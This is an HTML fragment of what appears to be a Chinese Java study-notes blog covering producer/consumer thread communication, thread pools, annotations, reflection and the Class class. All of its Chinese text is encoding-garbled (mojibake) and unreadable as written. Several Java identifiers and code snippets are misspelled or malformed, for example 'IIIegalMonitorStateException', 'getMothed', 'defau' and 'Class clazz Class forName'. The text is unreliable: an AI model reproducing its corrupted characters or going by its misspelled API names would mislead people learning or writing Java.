<li>æ³¨æ„ï¼šå‡æ˜¯ Objectç±»çš„æ–¹æ³•ï¼Œéƒ½åªèƒ½åœ¨åŒæ­¥æ–¹æ³•æˆ–è€…åŒæ­¥ä»£ç å—ä¸­ä½¿ç”¨ï¼Œå¦åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸IIIegalMonitorStateExceptionã€‚</li>
<li>è¿™æ˜¯ä¸€ä¸ªçº¿ç¨‹åŒæ­¥é—®é¢˜ï¼Œç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…å…±äº«åŒä¸€ä¸ªèµ„æºï¼Œå¹¶ä¸”ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…ä¹‹é—´ç›¸äº’ä¾èµ–ï¼Œäº’ä¸ºæ¡ä»¶ï¼š<ul>
<li>å¯¹äºç”Ÿäº§è€…ï¼Œæ²¡æœ‰ç”Ÿäº§äº§å“ä¹‹å‰ï¼Œè¦é€šçŸ¥æ¶ˆè´¹è€…ç­‰å¾…ã€‚è€Œç”Ÿäº§äº†äº§å“ä¹‹åï¼Œåˆéœ€è¦é©¬ä¸Šé€šçŸ¥æ¶ˆè´¹è€…æ¶ˆè´¹ã€‚</li>
<li>å¯¹äºæ¶ˆè´¹è€…ï¼Œåœ¨æ¶ˆè´¹ä¹‹åï¼Œè¦é€šçŸ¥ç”Ÿäº§è€…å·²ç»ç»“æŸæ¶ˆè´¹ï¼Œéœ€è¦ç”Ÿäº§æ–°çš„äº§å“ä»¥ä¾›æ¶ˆè´¹ã€‚</li>
<li>åœ¨ç”Ÿäº§è€…æ¶ˆè´¹è€…é—®é¢˜ä¸­ï¼Œä»…æœ‰ synchronizedæ˜¯ä¸å¤Ÿçš„ï¼š<ul>
<li>synchronizedå¯é˜»æ­¢å¹¶å‘æ›´æ–°åŒä¸€ä¸ªå…±äº«èµ„æºï¼Œå®ç°äº†åŒæ­¥ï¼›</li>
<li>synchronizedä¸èƒ½ç”¨æ¥å®ç°ä¸åŒçº¿ç¨‹ä¹‹é—´çš„æ¶ˆæ¯ä¼ é€’é€šä¿¡ã€‚</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="2-çº¿ç¨‹é€šä¿¡é—®é¢˜è§£å†³æ–¹å¼"><a href="#2-çº¿ç¨‹é€šä¿¡é—®é¢˜è§£å†³æ–¹å¼" class="headerlink" title="2.çº¿ç¨‹é€šä¿¡é—®é¢˜è§£å†³æ–¹å¼"></a>2.çº¿ç¨‹é€šä¿¡é—®é¢˜è§£å†³æ–¹å¼</h4><blockquote>
<p>è§£å†³æ–¹å¼ä¸€ï¼š</p>
<ul>
<li>å¹¶å‘åä½œæ¨¡å‹â€œç”Ÿäº§è€…&#x2F;æ¶ˆè´¹è€…æ¨¡å¼â€â€“&gt;ç®¡ç¨‹æ³•ï¼š<ul>
<li>ç”Ÿäº§è€…âˆ¶è´Ÿè´£ç”Ÿäº§æ•°æ®çš„æ¨¡å—ï¼ˆå¯èƒ½æ˜¯æ–¹æ³•ï¼Œå¯¹è±¡ï¼Œçº¿ç¨‹ï¼Œè¿›ç¨‹ï¼‰ï¼›</li>
<li>æ¶ˆè´¹è€…ï¼šè´Ÿè´£å¤„ç†æ•°æ®çš„æ¨¡å—ï¼ˆå¯èƒ½æ˜¯æ–¹æ³•ï¼Œå¯¹è±¡ï¼Œçº¿ç¨‹ï¼Œè¿›ç¨‹ï¼‰ï¼›</li>
<li>ç¼“å†²åŒºï¼šæ¶ˆè´¹è€…ä¸èƒ½ç›´æ¥ä½¿ç”¨ç”Ÿäº§è€…çš„æ•°æ®ï¼Œä»–ä»¬ä¹‹é—´æœ‰ä¸ªâ€œç¼“å†²åŒºâ€ã€‚</li>
</ul>
</li>
<li>ç”Ÿäº§è€…å°†ç”Ÿäº§å¥½çš„æ•°æ®æ”¾å…¥ç¼“å†²åŒºï¼Œæ¶ˆè´¹è€…ä»ç¼“å†²åŒºæ‹¿å‡ºæ•°æ®ã€‚</li>
</ul>
</blockquote>
<h3 id="5-çº¿ç¨‹æ± "><a href="#5-çº¿ç¨‹æ± " class="headerlink" title="5.çº¿ç¨‹æ± "></a>5.çº¿ç¨‹æ± </h3><ul>
<li>èƒŒæ™¯ï¼šç»å¸¸åˆ›å»ºå’Œé”€æ¯ã€ä½¿ç”¨é‡ç‰¹åˆ«å¤§çš„èµ„æºï¼Œæ¯”å¦‚å¹¶å‘æƒ…å†µä¸‹çš„çº¿ç¨‹ï¼Œå¯¹æ€§èƒ½å½±å“å¾ˆå¤§ã€‚</li>
<li>æ€è·¯ï¼šæå‰åˆ›å»ºå¥½å¤šä¸ªçº¿ç¨‹ï¼Œæ”¾å…¥çº¿ç¨‹æ± ä¸­ï¼Œä½¿ç”¨æ—¶ç›´æ¥è·å–ï¼Œä½¿ç”¨å®Œæ”¾å›æ± ä¸­ã€‚å¯ä»¥é¿å…é¢‘ç¹åˆ›å»ºé”€æ¯ã€å®ç°é‡å¤åˆ©ç”¨ã€‚ç±»ä¼¼ç”Ÿæ´»ä¸­çš„å…¬å…±äº¤é€šå·¥å…·ã€‚</li>
<li>å¥½å¤„ï¼š<ul>
<li>æé«˜å“åº”é€Ÿåº¦ï¼ˆå‡å°‘äº†åˆ›å»ºæ–°çº¿ç¨‹çš„æ—¶é—´ï¼‰ï¼›</li>
<li>é™ä½èµ„æºæ¶ˆè€—ï¼ˆé‡å¤åˆ©ç”¨çº¿ç¨‹æ± ä¸­çº¿ç¨‹ï¼Œä¸éœ€è¦æ¯æ¬¡éƒ½åˆ›å»ºï¼‰ï¼›</li>
<li>ä¾¿äºçº¿ç¨‹ç®¡ç†ï¼ˆâ€¦ï¼‰<ul>
<li>corePoolsizeï¼šæ ¸å¿ƒæ± çš„å¤§å°ï¼›</li>
<li>maximumPoolSizeï¼šæœ€å¤§çº¿ç¨‹æ•°ï¼›</li>
<li>keepAliveTimeï¼šçº¿ç¨‹æ²¡æœ‰ä»»åŠ¡æ—¶æœ€å¤šä¿æŒå¤šé•¿æ—¶é—´åä¼šç»ˆæ­¢ã€‚</li>
</ul>
</li>
</ul>
</li>
<li>JDK 5.0èµ·æä¾›äº†çº¿ç¨‹æ± ç›¸å…³AP:ExecutorServiceå’Œ Executorsã€‚</li>
<li>ExecutorServiceï¼šçœŸæ­£çš„çº¿ç¨‹æ± æ¥å£ã€‚å¸¸è§å­ç±» ThreadPoolExecutorã€‚<ul>
<li>void executeï¼ˆ Runnable commandï¼‰ï¼šæ‰§è¡Œä»»åŠ¡å‘½ä»¤ï¼Œæ²¡æœ‰è¿”å›å€¼ï¼Œä¸€èˆ¬ç”¨æ¥æ‰§è¡Œ Runnableï¼›</li>
<li><T> Future<T> submitï¼ˆ Callable<T>å¦‡askï¼‰ï¼šæ‰§è¡Œä»»åŠ¡ï¼Œæœ‰è¿”å›å€¼ï¼Œä¸€èˆ¬åˆæ¥æ‰§è¡ŒCallableï¼›</li>
<li>void shutdownï¼ˆï¼‰ï¼šå…³é—­è¿æ¥æ± ã€‚</li>
</ul>
</li>
<li>Executorsï¼šå·¥å…·ç±»ã€çº¿ç¨‹æ± çš„å·¥å‚ç±»ï¼Œç”¨äºåˆ›å»ºå¹¶è¿”å›ä¸åŒç±»å‹çš„çº¿ç¨‹æ± ã€‚</li>
</ul>
<blockquote>
<p>å¤šçº¿ç¨‹è¿˜å¾—çœ‹JUCï¼Œåè¾¹ä¹Ÿè¿˜ä¼šå†è®°å½•çš„</p>
</blockquote>
<h2 id="æ³¨è§£ä¸åå°„"><a href="#æ³¨è§£ä¸åå°„" class="headerlink" title="æ³¨è§£ä¸åå°„"></a>æ³¨è§£ä¸åå°„</h2><p>æ³¨è§£ä½¿ç”¨çš„æ›´å¤šçš„æ˜¯åœ¨åè¾¹çš„springã€springbootçš„æ¡†æ¶ä¸­ï¼Œä¼šå¤§é‡ä½¿ç”¨åˆ°å„ç§æ³¨è§£ã€‚</p>
<h3 id="1ã€æ³¨è§£"><a href="#1ã€æ³¨è§£" class="headerlink" title="1ã€æ³¨è§£"></a>1ã€æ³¨è§£</h3><h4 id="1ã€æ³¨è§£å…¥é—¨"><a href="#1ã€æ³¨è§£å…¥é—¨" class="headerlink" title="1ã€æ³¨è§£å…¥é—¨"></a>1ã€æ³¨è§£å…¥é—¨</h4><ul>
<li><p>Annotationæ˜¯jdk1.5å¼€å§‹å¼•å…¥çš„æ–°æŠ€æœ¯ã€‚</p>
</li>
<li><p>Annotationçš„ä½œç”¨ï¼š</p>
<ul>
<li>ä¸æ˜¯ç¨‹åºæœ¬èº«ï¼Œå¯ä»¥å¯¹ç¨‹åºä½œå‡ºè§£é‡Šï¼›</li>
<li>å¯ä»¥è¢«å…¶ä»–ç¨‹åºï¼ˆä¾‹å¦‚ç¼–è¯‘å™¨ï¼‰è¯»å–ã€‚</li>
</ul>
</li>
<li><p>Annotationçš„æ ¼å¼</p>
<ul>
<li>â€œ@æ³¨è§£åâ€ï¼Œä¹Ÿå¯ä»¥å¸¦å‚æ•°ï¼Œä¾‹å¦‚ï¼š@SuppressWarnings(value&#x3D;â€œunchckedâ€)</li>
</ul>
</li>
<li><p>Annotationåœ¨å“ªé‡Œä½¿ç”¨ï¼Ÿ</p>
<ul>
<li>å¯ä»¥é™„åŠ åœ¨packageã€classã€methodã€fieldä¸Šï¼Œç›¸å½“äºç»™å®ƒä»¬æ·»åŠ äº†é¢å¤–çš„è¾…åŠ©ä¿¡æ¯ï¼Œè¿˜å¯ä»¥é€šè¿‡åå°„æœºåˆ¶ç¼–ç¨‹å®ç°å¯¹è¿™äº›å…ƒæ•°æ®çš„è®¿é—®ã€‚</li>
</ul>
</li>
</ul>
<h4 id="2-å†…ç½®æ³¨è§£"><a href="#2-å†…ç½®æ³¨è§£" class="headerlink" title="2.å†…ç½®æ³¨è§£"></a>2.å†…ç½®æ³¨è§£</h4><ul>
<li>@ Overrideï¼šå®šä¹‰åœ¨ java. lang Overrideä¸­ï¼Œæ­¤æ³¨é‡Šåªé€‚ç”¨äºä¿®è¾æ–¹æ³•ï¼Œè¡¨ç¤ºä¸€ä¸ªæ–¹æ³•å£°æ˜æ‰“ç®—é‡å†™è¶…ç±»ä¸­çš„å¦ä¸€ä¸ªæ–¹æ³•å£°æ˜ã€‚</li>
<li>@ Deprecatedï¼šå®šä¹‰åœ¨ Java. lang. Deprecatedä¸­ï¼Œæ­¤æ³¨é‡Šå¯ä»¥ç”¨äºä¿®è¾æ–¹æ³•ï¼Œå±æ€§ï¼Œç±»ï¼Œè¡¨ç¤ºä¸é¼“åŠ±ç¨‹åºå‘˜ä½¿ç”¨è¿™æ ·çš„å…ƒç´ ï¼Œé€šå¸¸æ˜¯å› ä¸ºå®ƒå¾ˆå±é™©æˆ–è€…å­˜åœ¨æ›´å¥½çš„é€‰æ‹©ã€‚</li>
<li>@ SuppressWarningsï¼šå®šä¹‰åœ¨ Java. lang. SuppressWarningsä¸­ï¼Œç”¨æ¥æŠ‘åˆ¶ç¼–è¯‘æ—¶çš„è­¦å‘Šä¿¡æ¯ã€‚</li>
<li>ä¸å‰ä¸¤ä¸ªæ³¨é‡Šæœ‰æ‰€ä¸åŒï¼Œä½ éœ€è¦æ·»åŠ ä¸€ä¸ªå‚æ•°æ‰èƒ½æ­£ç¡®ä½¿ç”¨ï¼Œè¿™äº›å‚æ•°éƒ½æ˜¯å·²ç»å®šä¹‰å¥½äº†çš„ï¼Œæˆ‘ä»¬é€‰æ‹©æ€§çš„ä½¿ç”¨å°±å¥½äº†ã€‚<ul>
<li>@SuppressWarnings ï¼ˆ â€œallâ€ï¼‰</li>
<li>@SuppressWarnings ï¼ˆuncheckedâ€ï¼‰</li>
<li>@ SuppressWarningsï¼ˆvalue&#x3D;fâ€uncheckedâ€ï¼Œ â€œ deprecation â€œï¼‰</li>
<li>ç­‰ç­‰â€¦â€¦</li>
</ul>
</li>
</ul>
<h4 id="3ã€è‡ªå®šä¹‰æ³¨è§£"><a href="#3ã€è‡ªå®šä¹‰æ³¨è§£" class="headerlink" title="3ã€è‡ªå®šä¹‰æ³¨è§£"></a>3ã€è‡ªå®šä¹‰æ³¨è§£</h4><ul>
<li>å…ƒæ³¨è§£çš„ä½œç”¨å°±æ˜¯è´Ÿè´£æ³¨è§£å…¶ä»–æ³¨è§£ï¼ŒJavaå®šå‰äº†4ä¸ªæ ‡å‡†çš„meta- annotationç±»å‹ï¼Œä»–ä»¬è¢«ç”¨æ¥æä¾›å¯¹å…¶ä»– annotationç±»å‹ä½œè¯´æ˜ã€‚</li>
<li>è¿™äº›ç±»å‹å’Œå®ƒä»¬æ‰€æ”¯æŒçš„ç±»åœ¨ java. lang annotationåŒ…ä¸­å¯ä»¥æ‰¾åˆ°ã€‚ï¼ˆ@Targetï¼Œ@Retentionï¼Œ@Documented, @Inheritedï¼‰<ul>
<li>@ Targetï¼šç”¨äºæè¿°æ³¨è§£çš„ä½¿ç”¨èŒƒå›´ï¼ˆå³è¢«æè¿°çš„æ³¨è§£å¯ä»¥ç”¨åœ¨ä»€ä¹ˆåœ°æ–¹ï¼‰ã€‚</li>
<li>@ Retentionï¼šè¡¨ç¤ºéœ€è¦åœ¨ä»€ä¹ˆçº§åˆ«ä¿å­˜è¯¥æ³¨é‡Šä¿¡æ¯ï¼Œç”¨äºæè¿°æ³¨è§£çš„ç”Ÿå‘½å‘¨æœŸã€‚<ul>
<li>SOURCE &lt; CLASS &lt; RUNTIME</li>
</ul>
</li>
<li>@ Documentï¼šè¯´æ˜è¯¥æ³¨è§£å°†è¢«åŒ…å«åœ¨ Javadocä¸­ã€‚</li>
<li>@ Inheritedï¼šè¯´æ˜å­ç±»å¯ä»¥ç»§æ‰¿çˆ¶ç±»ä¸­çš„è¯¥æ³¨è§£ã€‚</li>
</ul>
</li>
</ul>
<blockquote>
<p>è‡ªå®šä¹‰æ³¨è§£</p>
</blockquote>
<ul>
<li>ä½¿ç”¨@ interfaceè‡ªå®šä¹‰æ³¨è§£æ—¶ï¼Œè‡ªåŠ¨ç»§æ‰¿äº† java. lang annotation. Annotationæ¥å£ã€‚</li>
<li>åˆ†æï¼š<ul>
<li>@ interfaceç”¨æ¥å£°æ˜ä¸€ä¸ªæ³¨è§£ï¼Œæ ¼å¼ï¼špublic@ interfaceæ³¨è§£å{å®šä¹‰å†…å®¹}</li>
<li>å…¶ä¸­çš„æ¯ä¸€ä¸ªæ–¹æ³•å®é™…ä¸Šæ˜¯å£°æ˜äº†ä¸€ä¸ªé…ç½®å‚æ•°ï¼›</li>
<li>æ–¹æ³•çš„åç§°å°±æ˜¯å‚æ•°çš„åç§°ã€‚</li>
<li>è¿”å›å€¼ç±»å‹å°±æ˜¯å‚æ•°çš„ç±»å‹ï¼ˆè¿”å›å€¼åªèƒ½æ˜¯åŸºæœ¬ç±»å‹ï¼Œ Class, String,enumï¼‰</li>
<li>å¯ä»¥é€šè¿‡ defauæ¥å£°æ˜å‚æ•°çš„é»˜è®¤å€¼ï¼›</li>
<li>å¦‚æœåªæœ‰ä¸€ä¸ªå‚æ•°æˆå‘˜ï¼Œä¸€èˆ¬å‚æ•°åä¸ºvaueï¼›</li>
<li>æ³¨è§£å…ƒç´ å¿…é¡»è¦æœ‰å€¼ï¼Œæˆ‘ä»¬å®šä¹‰æ³¨è§£å…ƒç´ æ—¶ï¼Œç»å¸¸ä½¿ç”¨ç©ºå­—ç¬¦ä¸²ï¼Œ0ä½œä¸ºé»˜è®¤å€¼</li>
</ul>
</li>
</ul>
<h3 id="2ã€åå°„æœºåˆ¶"><a href="#2ã€åå°„æœºåˆ¶" class="headerlink" title="2ã€åå°„æœºåˆ¶"></a>2ã€åå°„æœºåˆ¶</h3><h4 id="1-Javaåå°„æœºåˆ¶æ¦‚å¿µ"><a href="#1-Javaåå°„æœºåˆ¶æ¦‚å¿µ" class="headerlink" title="1.Javaåå°„æœºåˆ¶æ¦‚å¿µ"></a>1.Javaåå°„æœºåˆ¶æ¦‚å¿µ</h4><blockquote>
<ol>
<li>é™æ€ &amp; åŠ¨æ€è¯­è¨€</li>
</ol>
</blockquote>
<ul>
<li>åŠ¨æ€è¯­è¨€<ul>
<li>æ˜¯ä¸€ç±»åœ¨è¿è¡Œæ—¶å¯ä»¥æ”¹å˜å…¶ç»“æ„çš„è¯­è¨€ï¼šä¾‹å¦‚æ–°çš„å‡½æ•°ã€å¯¹è±¡ã€ç”šè‡³ä»£ç å¯ä»¥è¢«å¼•è¿›ï¼Œå·²æœ‰çš„å‡½æ•°å¯ä»¥è¢«åˆ é™¤æˆ–æ˜¯å…¶ä»–ç»“æ„ä¸Šçš„å˜åŒ–ã€‚é€šä¿—ç‚¹è¯´å°±æ˜¯åœ¨è¿è¡Œæ—¶ä»£ç å¯ä»¥æ ¹æ®æŸäº›æ¡ä»¶æ”¹å˜è‡ªèº«ç»“æ„ã€‚</li>
<li>ä¸»è¦åŠ¨æ€è¯­è¨€ï¼šObject-Cã€C#ã€ JavaScriptã€PHPã€ Pythonç­‰ã€‚</li>
</ul>
</li>
<li>é™æ€è¯­è¨€<ul>
<li>ä¸åŠ¨æ€è¯­è¨€ç›¸å¯¹åº”çš„ï¼Œè¿è¡Œæ—¶ç»“æ„ä¸å¯å˜çš„è¯­è¨€å°±æ˜¯é™æ€è¯­è¨€ã€‚å¦‚Javaã€Cã€C++ã€‚</li>
<li>Javaä¸æ˜¯åŠ¨æ€è¯­è¨€ï¼Œä½†Javaå¯ä»¥ç§°ä¹‹ä¸ºâ€œå‡†åŠ¨æ€è¯­è¨€â€ã€‚å³Javaæœ‰ä¸€å®šçš„åŠ¨æ€æ€§æˆ‘ä»¬å¯ä»¥åˆ©ç”¨åå°„æœºåˆ¶è·å¾—ç±»ä¼¼åŠ¨æ€è¯­è¨€çš„ç‰¹æ€§ã€‚Javaçš„åŠ¨æ€æ€§è®©ç¼–ç¨‹çš„æ—¶å€™æ›´åŠ çµæ´»ã€‚</li>
</ul>
</li>
</ul>
<blockquote>
<ol start="2">
<li>åå°„æœºåˆ¶æ¦‚å¿µ</li>
</ol>
</blockquote>
<ul>
<li>Reflectionï¼ˆåå°„ï¼‰æ˜¯Javaè¢«è§†ä¸ºåŠ¨æ€è¯­è¨€çš„å…³é”®ï¼Œåå°„æœºåˆ¶å…è®¸ç¨‹åºåœ¨æ‰§è¡ŒæœŸå€ŸåŠ©äº Reflection APå–å¾—ä»¼ä½•ç±»çš„å†…éƒ¨ä¿¡æ¯ï¼Œå¹¶èƒ½ç›´æ¥æ“ä½œä»»æ„å¯¹è±¡çš„å†…éƒ¨å±æ€§åŠæ–¹æ³•ã€‚<ul>
<li>Class c&#x3D; Class.forName(â€œjava. lang Stringâ€);</li>
</ul>
</li>
<li>åŠ è½½å®Œç±»ä¹‹åï¼Œåœ¨å †å…§å­˜çš„æ–¹æ³•åŒºä¸­å°±äº§ç”Ÿäº†ä¸€ä¸ª Classç±»å‹çš„å¯¹è±¡ï¼ˆä¸€ä¸ªç±»åªæœ‰ä¸€ä¸ªCasså¯¹è±¡ï¼‰ï¼Œè¿™ä¸ªå¯¹è±¡å°±åŒ…å«äº†å®Œæ•´çš„ç±»çš„ç»“æ„ä¿¡æ¯ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªå¯¹è±¡çœ‹åˆ°ç±»çš„ç»“æ„ã€‚è¿™ä¸ªå¯¹è±¡å°±åƒä¸€é¢é•œå­ï¼Œé€è¿‡è¿™ä¸ªé•œå­çœ‹åˆ°ç±»çš„ç»“æ„ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬å½¢è±¡çš„ç§°ä¹‹ä¸ºï¼šåå°„ã€‚</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/35703c4b7c062b664191ec914bbb765c--ee70--image-20241006201713560.png" alt="image-20241006201713560"></p>
<blockquote>
<ol start="3">
<li>åå°„æœºåˆ¶ç ”ç©¶ä¸åº”ç”¨</li>
</ol>
</blockquote>
<ul>
<li>Javaåå°„æœºåˆ¶æä¾›çš„åŠŸèƒ½<ul>
<li>åœ¨è¿è¡Œæ—¶åˆ¤æ–­ä»»æ„ä¸€ä¸ªå¯¹è±¡æ‰€å±çš„ç±»ï¼›</li>
<li>åœ¨è¿è¡Œæ—¶æ„é€ ä»»æ„ä¸€ä¸ªç±»çš„å¯¹è±¡ï¼›</li>
<li>åœ¨è¿è¡Œæ—¶åˆ¤æ–­ä»»æ„ä¸€ä¸ªç±»æ‰€å…·æœ‰çš„æˆå‘˜å˜é‡å’Œæ–¹æ³•ï¼›</li>
<li>åœ¨è¿è¡Œæ—¶è·å–æ³›å‹ä¿¡æ¯ï¼›</li>
<li>åœ¨è¿è¡Œæ—¶è°ƒç”¨ä»»æ„ä¸€ä¸ªå¯¹è±¡çš„æˆå‘˜å˜é‡å’Œæ–¹æ³•ï¼›</li>
<li>åœ¨è¿è¡Œæ—¶å¤„ç†æ³¨è§£ï¼›</li>
<li>ç”ŸæˆåŠ¨æ€ä»£ç†ï¼›</li>
<li>â€¦â€¦</li>
</ul>
</li>
</ul>
<blockquote>
<ol start="4">
<li>åå°„æœºåˆ¶ä¼˜ç¼ºç‚¹</li>
</ol>
</blockquote>
<ul>
<li>ä¼˜ç‚¹ï¼š<ul>
<li>å¯ä»¥å®ç°åŠ¨æ€åˆ›å»ºå¯¹è±¡å’Œç¼–è¯‘ï¼Œä½“ç°å‡ºå¾ˆå¤§çš„çµæ´»æ€§ã€‚</li>
</ul>
</li>
<li>ç¼ºç‚¹<ul>
<li>å¯¹æ€§èƒ½æœ‰å½±å“ã€‚ä½¿ç”¨åå°„åŸºæœ¬ä¸Šæ˜¯ä¸€ç§è§£é‡Šæ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥å‘Šè¯‰JVMï¼Œæˆ‘ä»¬å¸Œæœ›åšä»€ä¹ˆå¹¶ä¸”å®ƒæ»¡è¶³æˆ‘ä»¬çš„è¦æ±‚ã€‚è¿™ç±»æ“ä½œæ€»æ˜¯æ…¢äºç›´æ¥æ‰§è¡Œç›¸åŒçš„æ“ä½œã€‚</li>
</ul>
</li>
</ul>
<blockquote>
<p>&#x2F;*<br>        ä¸€ä¸ªç±»åœ¨å†…å­˜ä¸­åªæœ‰ä¸€ä¸ªClasså¯¹è±¡<br>        ä¸€ä¸ªç±»è¢«åŠ è½½å,ç±»çš„æ•´ä¸ªç»“æ„éƒ½ä¼šè¢«å°è£…åœ¨Classå¯¹è±¡ä¸­<br>        public native int hashCode();è¿”å›è¯¥å¯¹è±¡çš„hashç å€¼<br>        æ³¨ï¼šå“ˆå¸Œå€¼æ˜¯æ ¹æ®å“ˆå¸Œç®—æ³•ç®—å‡ºæ¥çš„ä¸€ä¸ªå€¼ï¼Œè¿™ä¸ªå€¼è·Ÿåœ°å€å€¼æœ‰å…³ï¼Œä½†ä¸æ˜¯å®é™…åœ°å€å€¼ã€‚<br>         *&#x2F;</p>
</blockquote>
<h4 id="2-ç†è§£Classç±»å¹¶è·å–Classå®ä¾‹"><a href="#2-ç†è§£Classç±»å¹¶è·å–Classå®ä¾‹" class="headerlink" title="2.ç†è§£Classç±»å¹¶è·å–Classå®ä¾‹"></a>2.ç†è§£Classç±»å¹¶è·å–Classå®ä¾‹</h4><blockquote>
<ol>
<li>classç±»ä»‹ç»</li>
</ol>
</blockquote>
<ul>
<li>åœ¨ Objectç±»ä¸­å®šä¹‰äº†ä»¥ä¸‹çš„æ–¹æ³•ï¼Œæ­¤æ–¹æ³•å°†è¢«æ‰€æœ‰å­ç±»ç»§æ‰¿<ul>
<li>public final Class getclass()</li>
</ul>
</li>
<li>ä»¥ä¸Šçš„æ–¹æ³•è¿”å›å€¼çš„ç±»å‹æ˜¯ä¸€ä¸ª Classç±»ï¼Œæ­¤ç±»æ˜¯Javaåå°„çš„æºå¤´ï¼Œå®é™…ä¸Šæ‰€è°“åå°„ä»ç¨‹åºçš„è¿è¡Œç»“æœæ¥çœ‹ä¹Ÿå¾ˆå¥½ç†è§£ï¼Œå³ï¼šå¯ä»¥é€šè¿‡å¯¹è±¡åå°„æ±‚å‡ºç±»çš„åç§°ã€‚</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/be9b8c63ed6e11166c584df0ec7d46bd--d62e--image-20241006203510092.png" alt="image-20241006203510092"></p>
<ul>
<li><p>å¯¹è±¡ç…§é•œå­åå¯ä»¥å¾—åˆ°çš„ä¿¡æ¯ï¼šæŸä¸ªç±»çš„å±æ€§ã€æ–¹æ³•å’Œæ„é€ å™¨ã€æŸä¸ªç±»åˆ°åº•å®ç°äº†å“ªäº›æ¥å£å¯¹äºæ¯ä¸ªç±»è€Œè¨€ï¼ŒJREéƒ½ä¸ºå…¶ä¿ç•™ä¸€ä¸ªä¸å˜çš„Cassç±»å‹çš„å¯¹è±¡ã€‚ä¸€ä¸ªClasså¯¹è±¡åŒ…å«äº†ç‰¹å®šæŸä¸ªç»“æ„ï¼ˆ class&#x2F;interface&#x2F;enum&#x2F;annotation&#x2F; primitive type&#x2F;void&#x2F;[]ï¼‰çš„æœ‰å…³ä¿¡æ¯ã€‚</p>
<ul>
<li>Classæœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªç±»ï¼›</li>
<li>Classå¯¹è±¡åªèƒ½ç”±ç³»ç»Ÿå»ºç«‹å¯¹è±¡ï¼›</li>
<li>ä¸€ä¸ªåŠ è½½çš„ç±»åœ¨JVMä¸­åªä¼šæœ‰ä¸€ä¸ªClasså®ä¾‹ï¼›</li>
<li>ä¸€ä¸ªCasså¯¹è±¡å¯¹åº”çš„æ˜¯ä¸€ä¸ªåŠ è½½åˆ°JMä¸­çš„ä¸€ä¸ªclassæ–‡ä»¶ï¼›</li>
<li>æ¯ä¸ªç±»çš„å®ä¾‹éƒ½ä¼šè®°å¾—è‡ªå·±æ˜¯ç”±å“ªä¸ªClasså®ä¾‹æ‰€ç”Ÿæˆï¼›</li>
<li>é€šè¿‡classå¯ä»¥å®Œæ•´åœ°å¾—åˆ°ä¸€ä¸ªç±»ä¸­çš„æ‰€æœ‰è¢«åŠ è½½çš„ç»“æ„ï¼›</li>
<li>classç±»æ˜¯ Reflectionçš„æ ¹æºï¼Œé’ˆå¯¹ä»»ä½•ä½ æƒ³åŠ¨æ€åŠ è½½ã€è¿è¡Œçš„ç±»ï¼Œå”¯æœ‰å…ˆè·å¾—ç›¸åº”çš„Classå¯¹è±¡ã€‚</li>
</ul>
</li>
<li><p>classç±»çš„å¸¸ç”¨æ–¹æ³•</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>æ–¹æ³•å</th>
<th>åŠŸèƒ½è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>static ClassforName (String name)</td>
<td>è¿”å›æŒ‡å®šç±»ånameçš„classå¯¹è±¡</td>
</tr>
<tr>
<td>Object newInstance ()</td>
<td>è°ƒç”¨ç¼ºçœæ„é€ å‡½æ•°ï¼Œè¿”å› Classå¯¹è±¡çš„ä¸€ä¸ªå®ä¾‹</td>
</tr>
<tr>
<td>getName ()</td>
<td>è¿”å›æ­¤Classå¯¹è±¡æ‰€è¡¨ç¤ºçš„å®ä½“ï¼ˆç±»ï¼Œæ¥å£ï¼Œæ•°ç»„ç±»æˆ–voidï¼‰çš„åç§°ã€‚</td>
</tr>
<tr>
<td>Class getSuperClass ()</td>
<td>è¿”å›å½“å‰classå¯¹è±¡çš„çˆ¶ç±»çš„classå¯¹è±¡</td>
</tr>
<tr>
<td>Class[] getinterfaces ()</td>
<td>è·å–å½“å‰ Classå¯¹è±¡çš„æ¥å£</td>
</tr>
<tr>
<td>ClassLoader getclassLoader ()</td>
<td>è¿”å›è¯¥ç±»çš„ç±»åŠ è½½å™¨</td>
</tr>
<tr>
<td>Constructor getConstructors ()</td>
<td>è¿”å›ä¸€ä¸ªåŒ…å«æŸäº› Constructorå¯¹è±¡çš„æ•°ç»„</td>
</tr>
<tr>
<td>Method getMothed (String name, Classâ€¦T)</td>
<td>è¿”å›ä¸€ä¸ª Methodå¯¹è±¡ï¼Œæ­¤å¯¹è±¡çš„å½¢å‚ç±»å‹ä¸ºparamType</td>
</tr>
<tr>
<td>Field[] getDeclaredFields ()</td>
<td>è¿”å›Fieldå¯¹è±¡çš„ä¸€ä¸ªæ•°ç»„</td>
</tr>
</tbody></table>
<blockquote>
<ol start="2">
<li>è·å–Classç±»çš„å®ä¾‹</li>
</ol>
</blockquote>
<ul>
<li>è‹¥å·²çŸ¥å…·ä½“çš„ç±»ï¼Œé€šè¿‡ç±»çš„classå±æ€§è·å–ï¼Œè¯¥æ–¹æ³•æœ€ä¸ºå®‰å…¨å¯é ï¼Œç¨‹åºæ€§èƒ½æœ€é«˜ã€‚<ul>
<li>Class clazz&#x3D;Person.class;</li>
</ul>
</li>
<li>å·²çŸ¥æŸä¸ªç±»çš„å®ä¾‹ï¼Œè°ƒç”¨è¯¥å®ä¾‹çš„ getclass () æ–¹æ³•è·å–Classå¯¹è±¡ã€‚<ul>
<li>Class clazz&#x3D; person. getClass();</li>
</ul>
</li>
<li>å·²çŸ¥ä¸€ä¸ªç±»çš„å…¨ç±»åï¼Œä¸”è¯¥ç±»åœ¨ç±»è·¯å¾„ä¸‹ï¼Œå¯é€šè¿‡classç±»çš„é™æ€æ–¹æ³• forNameï¼ˆè·å–ï¼Œå¯èƒ½æŠ›å‡º ClassNotFound Exceptionã€‚<ul>
<li>Class clazz Class forNameï¼ˆâ€demo01 Studentâ€);</li>
</ul>
</li>
<li>å†…ç½®åŸºæœ¬æ•°æ®ç±»å‹å¯ä»¥ç›´æ¥ç”¨ç±»å.Typeã€‚</li>
